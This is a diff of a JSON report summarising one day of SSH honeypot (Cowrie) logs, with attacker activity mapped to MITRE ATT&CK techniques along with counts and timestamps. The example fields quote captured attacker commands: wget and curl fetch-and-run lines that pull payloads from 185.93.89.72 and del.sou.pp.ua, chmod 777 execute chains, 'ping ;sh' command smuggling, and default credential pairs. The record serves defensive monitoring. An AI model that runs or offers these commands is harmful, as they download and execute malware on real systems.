@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-13 09:04:43",
+  "generated": "2026-08-13 10:01:31",
   "totals": {
-    "commands": 1376,
-    "login_failed": 1463,
-    "login_success": 78,
-    "sessions": 1619
+    "commands": 1422,
+    "login_failed": 1488,
+    "login_success": 84,
+    "sessions": 1648
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1463,
+      "count": 1488,
       "examples": [
         "user1 / 123456",
         "root / 1234567",
@@ -21,14 +21,14 @@
         "user1 / 12345678"
       ],
       "first": "2026-08-13T00:00:04.398982Z",
-      "last": "2026-08-13T08:56:20.359169Z",
-      "unique_ips": 76
+      "last": "2026-08-13T09:56:45.705789Z",
+      "unique_ips": 83
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 282,
+      "count": 297,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -37,14 +37,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-13T00:01:53.648846Z",
-      "last": "2026-08-13T08:24:36.351279Z",
-      "unique_ips": 25
+      "last": "2026-08-13T09:05:57.180568Z",
+      "unique_ips": 26
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 129,
+      "count": 133,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -53,14 +53,14 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-13T00:01:55.509663Z",
-      "last": "2026-08-13T08:24:36.351279Z",
-      "unique_ips": 25
+      "last": "2026-08-13T09:05:57.180568Z",
+      "unique_ips": 26
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 78,
+      "count": 84,
       "examples": [
         "root / root",
         "root / 123@@@",
@@ -69,21 +69,21 @@
         "orangepi / orangepi"
       ],
       "first": "2026-08-13T00:01:49.585213Z",
-      "last": "2026-08-13T08:35:24.121820Z",
-      "unique_ips": 49
+      "last": "2026-08-13T09:43:11.753871Z",
+      "unique_ips": 54
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 18,
+      "count": 19,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-13T00:01:55.509663Z",
-      "last": "2026-08-13T08:22:49.486223Z",
-      "unique_ips": 18
+      "last": "2026-08-13T09:05:20.995420Z",
+      "unique_ips": 19
     },
     {
       "id": "T1082",
@@ -219,23 +219,31 @@
   "unmapped": [
     [
       "/bin/busybox",
-      755
+      763
     ],
     [
       "shell",
-      25
+      28
     ],
     [
       "sh",
-      25
+      28
     ],
     [
       "system",
-      24
+      27
     ],
     [
       "enable",
-      23
+      25
+    ],
+    [
+      "linuxshell",
+      21
+    ],
+    [
+      "ping ;sh",
+      20
     ],
     [
       "zalee",
@@ -250,28 +258,20 @@
       20
     ],
     [
-      "linuxshell",
+      "enablelinuxshell",
       19
     ],
     [
-      "ping ;sh",
-      18
-    ],
-    [
-      "enablelinuxshell",
-      17
-    ],
-    [
       "cd /proc && cat self/cmdline",
+      19
+    ],
+    [
+      "busybox",
       17
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       16
-    ],
-    [
-      "busybox",
-      15
     ],
     [
       "command -v python3 >/dev/null 2>&1 || (command -v apt-get >/dev/null 2>&1 && timeout 30 apt-get update -y; apt-get insta",
